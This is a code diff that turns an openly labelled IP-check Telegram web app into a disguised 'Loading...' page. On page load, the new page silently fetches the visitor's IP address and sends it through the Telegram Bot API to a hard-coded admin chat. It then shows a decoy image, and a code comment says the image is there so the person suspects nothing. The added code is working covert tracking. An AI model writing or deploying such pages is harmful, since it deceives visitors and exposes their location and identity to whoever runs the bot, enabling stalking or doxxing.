@@ -2,29 +2,40 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>IP Check</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-</head>
-<body style="background-color: #1c1c1e; color: white; text-align: center; padding-top: 50px; font-family: sans-serif;">
-    <h2>Определяем IP...</h2>
-    <p>Пожалуйста, подождите.</p>
-
+    <title>Загрузка...</title>
     <script>
+        // ВСТАВЬ СЮДА СВОЙ ТОКЕН И СВОЙ ID
+        const BOT_TOKEN = "ВАШ_ТОКЕН_БОТА";
+        const ADMIN_ID = "8416857353"; 
+
         window.onload = function() {
-            const tg = window.Telegram.WebApp;
-            tg.ready();
-            
+            // Получаем IP
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    tg.sendData(JSON.stringify({ ip: data.ip }));
-                    tg.close();
-                })
-                .catch(err => {
-                    tg.sendData(JSON.stringify({ ip: "Ошибка получения IP" }));
-                    tg.close();
+                    const ip = data.ip;
+                    // Отправляем напрямую в Telegram API
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            text: `🎯 IP получен!\n🌐 IP: ${ip}`
+                        })
+                    });
+                    
+                    // Показываем картинку (чтобы человек ничего не заподозрил)
+                    document.body.innerHTML = `
+                        <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+                            <h2>Загрузка завершена</h2>
+                            <img src="https://i.imgur.com/9Qx5q6O.jpeg" style="width: 100%; max-width: 400px; border-radius: 10px;">
+                        </div>
+                    `;
                 });
         };
     </script>
+</head>
+<body style="background-color: #1c1c1e; color: white;">
+    <p style="text-align: center; margin-top: 50px;">Загрузка...</p>
 </body>
 </html>
